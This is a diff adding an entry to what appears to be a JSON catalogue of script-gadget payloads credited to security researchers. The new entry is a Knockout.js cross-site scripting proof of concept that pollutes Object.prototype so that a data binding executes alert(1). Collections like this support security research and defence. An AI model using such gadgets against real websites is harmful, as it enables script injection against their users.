@@ -208,5 +208,15 @@
         "twitterHandle": "Black2Fan",
         "version": "",
         "fingerprint": "return (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined')"
+    },
+    {
+        "library": "Knockout.js", 
+        "payload": "<strong data-bind=\"text:'hello'\"><\/strong>\n<script>\nObject.prototype[4]=\"a':1,[alert(1)]:1,'b\";Object.prototype[5]=',';\n<\/script><script>\nko.applyBindings({})\n<\/script>",
+        "frameworkCode": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.0/knockout-min.js\"></script>",
+        "frameworkAfter": false,
+        "author": "Michał Bentkowski",
+        "twitterHandle": "SecurityMB",
+        "version": "",
+        "fingerprint": ""
     }
 ]
